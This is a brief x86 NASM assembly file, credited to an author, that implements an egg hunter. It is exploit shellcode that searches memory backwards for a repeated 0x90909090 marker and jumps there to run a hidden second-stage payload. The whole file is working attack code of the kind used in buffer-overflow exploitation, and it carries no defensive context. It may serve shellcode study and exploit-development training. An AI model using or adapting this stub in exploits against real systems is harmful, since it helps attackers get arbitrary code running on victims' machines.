; Hunter.nasm
; Author: Tristan aka R3OATH
; Website: www.r3oath.com

global _start

section .text
_start:
	jmp short _call

_hunt:
	pop eax

_search:
	dec eax
	cmp dword [eax], 0x90909090	; Egg signature
	jne _search
	cmp dword [eax-4], 0x90909090	; Egg signature
	jne _search
	jmp eax 			; We've found our egg, execute it!

_call:
	call _hunt
